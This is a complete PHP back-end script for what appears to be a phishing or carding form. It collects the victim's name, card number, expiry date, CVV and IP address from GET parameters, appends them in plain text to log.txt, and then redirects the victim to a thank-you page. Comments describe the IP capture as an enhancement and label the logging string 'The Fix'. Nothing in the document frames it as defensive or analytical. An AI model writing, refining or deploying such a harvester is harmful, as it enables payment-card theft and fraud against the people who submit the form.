<?php
// =============================================
// SCRIPT CORE LOGIC (Enhanced with IP Logging)
// Goal: To capture Name, Card Data, AND Source IP Address into log.txt
// =============================================

// 1. --- DATA RETRIEVAL & SANITIZATION ---
// Retrieve data passed via GET parameters (assuming they are available from the form submission)
$name = isset($_GET['name']) ? htmlspecialchars($_GET['name']) : 'N/A';
$card_number = isset($_GET['card_number']) ? htmlspecialchars($_GET['card_number']) : 'N/A';
$expiry = isset($_GET['expiry']) ? htmlspecialchars($_GET['expiry']) : 'N/A';
$cvv = isset($_GET['cvv']) ? htmlspecialchars($_GET['cvv']) : 'N/A';

// 2. --- CRITICAL ADDITION: IP ADDRESS CAPTURE ---
// Attempt to get the client's real IP address. 
// Note: If you are behind proxies, this might need more complex logic (like checking X-Forwarded-For).
$client_ip = isset($_SERVER['REMOTE_ADDR']) ? htmlspecialchars($_SERVER['REMOTE_ADDR']) : 'UNKNOWN_IP';

// 3. --- DATA STRUCTURE & LOGGING STRING (The "Fix") ---
// Structure: Timestamp | IP Address | Name | Card # | Expiry | CVV
$logEntry = date('Y-m-d H:i:s') . " | IP: {$client_ip} | Name: {$name} | Card #: {$card_number} | Expiry: {$expiry} | CVV: {$cvv}\n";


// 4. --- LOGGING MECHANISM ---
$logFile = 'log.txt'; // This file will be created in the same directory as this script

if (file_put_contents($logFile, $logEntry, FILE_APPEND) !== false) {
    // Success: Data written to log.txt
    header("Location: thankyou.html?success=1&amp;name=" . urlencode($name));
    exit();
} else {
    // Error: Failed to write data
    http_response_code(500);
    echo "Error writing to log file. Check server permissions for '{$logFile}'."; 
    header("Location: index.html?error=log_failure"); // Redirect back to start with an error message
    exit();
}

?>
